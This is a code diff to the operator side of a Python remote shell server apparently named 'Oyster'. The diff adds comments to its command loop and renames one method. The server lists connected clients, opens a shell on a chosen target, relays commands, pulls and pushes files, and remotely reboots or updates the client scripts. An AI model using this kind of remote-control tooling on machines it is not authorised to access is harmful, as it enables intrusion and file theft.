@@ -535,16 +535,21 @@ o       O o   O `Ooo.   O   OooO'  o
                 self.connection_mgr.current_connection = None
                 break
 
+            # Get a file from the client.
+            # > get {remote filepath} {local filepath}
             if command[:4] == 'get ':
                 filepaths = command[4:]
                 self.get_file(filepaths)
                 continue
 
+            # Upload a file to the client.
+            # > upload {local filepath} {remote filepath}
             if command[:7] == 'upload ':
                 filepaths = command[7:]
                 print(self.handle_upload(filepaths=filepaths))
                 continue
 
+            # Reboot the target's client.py file remotely.
             if command == 'shell reboot':
                 try:
                     self.connection_mgr.send_command(command)
@@ -553,6 +558,7 @@ o       O o   O `Ooo.   O   OooO'  o
                     break
                 continue
 
+            # Send command through.
             try:
                 response = self.connection_mgr.send_command(command)
             except BrokenPipeError as err_msg:
@@ -572,10 +578,12 @@ o       O o   O `Ooo.   O   OooO'  o
         while True:
             command = input('Oyster> ')
 
+            # List connected clients.
             if command == 'list':
                 print(self.connection_mgr)
                 continue
 
+            # Drop into the given connection's shell.
             if command[:3] == 'use':
                 if command.lower() == 'use none':
                     self.connection_mgr.use_connection(None)
@@ -585,25 +593,25 @@ o       O o   O `Ooo.   O   OooO'  o
                     print('Could not connect to client with given information.')
                     continue
 
-                self.client_shell()
+                self.start_client_shell()
                 continue
 
+            # Update all clients using the local update.py file.
             if command == 'update all':
                 self.update_clients()
                 continue
 
+            # Upload file to
             if command == 'upload':
                 print(self.handle_upload())
                 continue
 
-            if command == 'flush':
-                # Flush anything that fucks up the server.
-                continue
-
+            # Quit the server.py app down.
             if command == 'quit' or command == 'exit' or command == 'shutdown':
                 self.handle_quit()
                 return False
 
+            # Reboot self.
             if command == 'reboot':
                 print('Rebooting...')
                 self.reboot_self()
